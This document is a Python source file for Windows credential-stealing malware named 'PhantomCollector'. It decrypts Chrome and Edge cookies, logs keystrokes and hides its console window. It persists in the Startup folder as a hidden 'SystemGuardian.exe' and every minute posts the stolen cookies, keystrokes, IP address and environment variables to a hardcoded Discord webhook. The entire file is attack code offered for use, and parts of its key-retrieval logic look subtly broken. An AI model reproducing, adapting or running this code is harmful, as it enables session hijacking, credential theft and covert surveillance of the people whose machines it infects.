#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 01001100 01100101 01110100 00100111 01110011 00100000 01100100 01101111 00100000 01110100 01101000 01100101 00100000 01100100 01100001 01101110 01100011 01100101 00100000 01101111 01100110 00100000 01100011 01101000 01100001 01101111 01110011

import os
import sys
import json
import sqlite3
import shutil
import requests
import threading
import keylogger
import win32crypt
import subprocess
from Crypto.Cipher import AES
from datetime import datetime, timedelta

# ███╗░░░███╗░█████╗░██╗░░░░░░█████╗░██╗░░░██╗███████╗
# ████╗░████║██╔══██╗██║░░░░░██╔══██╗██║░░░██║██╔════╝
# ██╔████╔██║███████║██║░░░░░██║░░██║╚██╗░██╔╝█████╗░░
# ██║╚██╔╝██║██╔══██║██║░░░░░██║░░██║░╚████╔╝░██╔══╝░░
# ██║░╚═╝░██║██║░░██║███████╗╚█████╔╝░░╚██╔╝░░███████╗
# ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝

WEBHOOK_URL = "https://discord.com/api/webhooks/1365835591199101040/CFSg6aOT0MGm6JwzCBaVhsQczwpaC8Q4VdG_n-b9394u4Y_kU1dNitQbgDHewRiYSMbP"
STEALTH_MODE = True
PERSISTENCE = True

class PhantomCollector:
    def __init__(self):
        self.ip = self._get_public_ip()
        self.cookies = []
        self.keylogs = ""
        
    def _get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "IP_FETCH_FAIL"

    def _chrome_time(self, time):
        return datetime(1601, 1, 1) + timedelta(microseconds=time)

    def _decrypt_value(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return "DECRYPTION_FAILED"

    def harvest_chrome_cookies(self):
        paths = [
            os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies',
            os.environ['USERPROFILE'] + r'\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies'
        ]
        
        for path in paths:
            if not os.path.exists(path):
                continue
            
            temp_db = os.environ['TEMP'] + '\\PhantomCookies.db'
            shutil.copyfile(path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            conn.text_factory = lambda b: b.decode(errors='ignore')
            cursor = conn.cursor()
            
            cursor.execute('SELECT host_key, name, encrypted_value, expires_utc FROM cookies')
            key = win32crypt.CryptUnprotectData(subprocess.check_output(
                'powershell Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"',
                shell=True
            ).split(b"PathToExe")[1].split(b"\r\n\r\n")[0].strip(), None, None, None, 0)[1]

            for host, name, encrypted_value, expires in cursor.fetchall():
                decrypted = self._decrypt_value(encrypted_value, key)
                if decrypted:
                    self.cookies.append({
                        'host': host,
                        'name': name,
                        'value': decrypted,
                        'expires': str(self._chrome_time(expires)),
                        'browser': 'Chrome' if 'Chrome' in path else 'Edge'
                    })
            
            conn.close()
            os.remove(temp_db)

    def start_keylogger(self):
        def on_key_press(event):
            self.keylogs += event.name if event.name else f"[{event}]"
            
        keyboard_thread = threading.Thread(
            target=keylogger.KeyLogger(
                on_press=on_key_press,
                report_method=lambda: None,
                report_interval=60
            ).start
        )
        keyboard_thread.daemon = True
        keyboard_thread.start()

    def establish_persistence(self):
        startup_path = os.path.join(
            os.environ['APPDATA'], 
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\',
            'SystemGuardian.exe'
        )
        if not os.path.exists(startup_path):
            shutil.copyfile(sys.executable, startup_path)
            subprocess.call(f'attrib +h "{startup_path}"', shell=True)

    def exfiltrate_data(self):
        payload = {
            'ip': self.ip,
            'cookies': self.cookies,
            'keylogs': self.keylogs,
            'system': dict(os.environ)
        }
        requests.post(WEBHOOK_URL, json=payload)
        self.keylogs = ""

    def execute_phantom_protocol(self):
        if STEALTH_MODE:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
        if PERSISTENCE:
            self.establish_persistence()
            
        self.harvest_chrome_cookies()
        self.start_keylogger()
        
        while True:
            threading.Timer(60.0, self.exfiltrate_data).start()
            threading.Event().wait(60)

if __name__ == "__main__":
    phantom = PhantomCollector()
    phantom.execute_phantom_protocol()